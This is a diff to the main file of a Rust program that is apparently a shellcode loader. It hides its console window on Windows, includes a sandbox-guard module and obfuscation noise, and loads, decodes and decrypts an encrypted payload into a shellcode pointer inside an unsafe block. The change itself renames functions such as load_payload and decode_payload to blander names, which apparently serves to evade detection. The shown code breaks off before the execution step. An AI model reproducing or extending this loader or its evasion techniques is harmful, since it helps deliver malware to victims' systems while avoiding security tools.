@@ -1,6 +1,6 @@
 #![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")]
 mod utils;
-mod load_payload;
+mod load;
 mod exec;
 mod decrypt;
 mod alloc;
@@ -12,9 +12,9 @@ mod bundle;
 #[cfg(feature = "sandbox")]
 mod guard;
 
-use load_payload::load_payload;
+use load::load;
 use decrypt::decrypt;
-use decode::decode_payload;
+use decode::decode;
 use exec::exec;
 #[cfg(feature = "debug")]
 use utils::{print_error, print_message};
@@ -63,7 +63,7 @@ fn main() {
         obfuscation_noise_macro!();
     }
 
-    let encrypted_data = match load_payload() {
+    let encrypted_data = match load() {
         Ok(data) => {
             #[cfg(feature = "debug")]
             print_message("Payload loaded successfully.");
@@ -77,7 +77,7 @@ fn main() {
         }
     };
 
-    let decrypted_data = decode_payload(&encrypted_data).unwrap();
+    let decrypted_data = decode(&encrypted_data).unwrap();
 
     unsafe {
         let (shellcode_ptr, shellcode_len) = match decrypt(&decrypted_data) {
